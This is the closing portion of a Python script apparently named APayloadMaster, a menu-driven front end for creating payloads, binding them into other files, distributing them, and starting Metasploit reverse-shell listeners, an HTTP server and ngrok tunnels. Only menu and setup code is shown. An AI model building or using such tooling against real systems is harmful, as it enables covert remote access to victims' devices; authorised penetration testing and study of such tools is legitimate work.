            print(f"{self.colors.CYAN}4. {self.colors.GREEN}Start Listener{self.colors.CYAN} (Metasploit){self.colors.ENDC}")
            print(f"{self.colors.CYAN}5. {self.colors.GREEN}Start HTTP Server{self.colors.CYAN} (File Sharing){self.colors.ENDC}")
            print(f"{self.colors.CYAN}6. {self.colors.YELLOW}Check Dependencies{self.colors.CYAN} (Required Tools){self.colors.ENDC}")
            print(f"{self.colors.CYAN}7. {self.colors.RED}Exit{self.colors.CYAN} (Cleanup Resources){self.colors.ENDC}")
            
            choice = input(f"\n{self.colors.YELLOW}[?] Select option (1-7): {self.colors.ENDC}")
            if choice == "1":
                self.create_payload_menu()
            elif choice == "2":
                self.binding_menu()
            elif choice == "3":
                if self.current_payload:
                    self.distribution_menu(self.current_payload)
                else:
                    filepath = input(f"{self.colors.YELLOW}[?] Enter payload path: {self.colors.ENDC}")
                    if os.path.exists(filepath):
                        self.distribution_menu(filepath)
            elif choice == "4":
                if self.current_lhost and self.current_lport and self.current_payload_type:
                    self.start_metasploit_listener()
                else:
                    print(f"{self.colors.RED}[!] No payload settings found. Generate a payload first or enter manually.{self.colors.ENDC}")
                    lhost = input(f"{self.colors.YELLOW}[?] Enter LHOST: {self.colors.ENDC}")
                    lport = input(f"{self.colors.YELLOW}[?] Enter LPORT: {self.colors.ENDC}")
                    print("Select payload type for listener:")
                    print("1. Android\n2. Windows\n3. Linux\n4. Python\n5. PowerShell\n6. Bash")
                    ptype = input(f"{self.colors.YELLOW}[?] Choice: {self.colors.ENDC}")
                    type_map = {"1":"android","2":"windows","3":"linux","4":"python","5":"powershell","6":"bash"}
                    self.current_lhost = lhost
                    self.current_lport = lport
                    self.current_payload_type = type_map.get(ptype, "windows")
                    self.start_metasploit_listener()
            elif choice == "5":
                port = input(f"{self.colors.YELLOW}[?] Enter port (default: 8080): {self.colors.ENDC}") or "8080"
                self.start_http_server(port)
            elif choice == "6":
                missing = self.check_dependencies()
                if missing:
                    print(f"{self.colors.RED}[!] Missing: {', '.join(missing)}{self.colors.ENDC}")
                else:
                    print(f"{self.colors.GREEN}[+] All dependencies found{self.colors.ENDC}")
            elif choice == "7":
                print(f"{self.colors.RED}[!] Exiting APayloadMaster...{self.colors.ENDC}")
                if self.ngrok_process:
                    self.ngrok_process.terminate()
                if self.http_server:
                    self.http_server.shutdown()
                print(f"{self.colors.GREEN}[+] Cleanup complete. Goodbye!{self.colors.ENDC}")
                sys.exit(0)

def main():
    tool = APayloadMaster()
    tool.display_banner()
    missing = tool.check_dependencies()
    if "Metasploit Framework" in missing:
        print(f"{Colors.RED}[!] Critical: Metasploit not found!{Colors.ENDC}")
        print(f"{Colors.YELLOW}[*] Install with: sudo apt install metasploit-framework{Colors.ENDC}")
        choice = input(f"{Colors.YELLOW}[?] Continue anyway? (y/n): {Colors.ENDC}")
        if choice.lower() != 'y':
            return
    tool.main_menu()

if __name__ == "__main__":
    main()
